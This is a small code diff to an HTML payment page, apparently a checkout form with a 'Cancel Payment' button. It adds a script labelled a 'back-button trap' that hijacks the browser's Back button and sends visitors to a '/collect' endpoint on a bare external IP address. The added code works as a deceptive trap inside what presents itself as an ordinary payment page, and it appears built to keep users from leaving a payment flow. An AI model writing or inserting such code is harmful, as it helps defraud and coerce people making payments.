@@ -67,5 +67,13 @@
     <button type="submit" class="btn btn-cancel">✕ Cancel Payment</button>
   </form>
 </div>
+
+<script>
+  // back-button trap — redirect to collect page instead of going back
+  history.pushState(null, '', window.location.href);
+  window.addEventListener('popstate', function() {
+    window.location.replace('http://132.154.156.82:3001/collect');
+  });
+</script>
 </body>
 </html>
